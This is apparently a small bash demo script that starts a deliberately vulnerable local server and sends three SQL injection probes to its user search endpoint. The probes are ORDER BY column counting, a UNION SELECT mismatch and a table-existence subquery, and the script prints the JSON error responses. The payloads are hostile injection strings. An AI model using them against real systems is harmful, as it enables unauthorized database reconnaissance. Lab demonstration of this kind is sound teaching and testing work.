#!/bin/bash

echo "Starting vulnerable server..."
bun index.ts &
SERVER_PID=$!
sleep 2

echo -e "\n1. Determining column count (ORDER BY TERM OUT OF RANGE):"
curl -s "http://localhost:3000/users/search?username=admin'%20ORDER%20BY%2010%20--" | json_pp

echo -e "\n2. Determining column count mismatch (UNION SELECT):"
curl -s "http://localhost:3000/users/search?username=admin'%20UNION%20SELECT%201,2,3,4,5%20--" | json_pp

echo -e "\n3. Checking for table existence (NO SUCH TABLE):"
curl -s "http://localhost:3000/users/search?username=admin'%20AND%20(SELECT%20count(*)%20FROM%20users_doesnt_exist)%20=%200%20--" | json_pp

echo -e "\nStopping server..."
kill $SERVER_PID
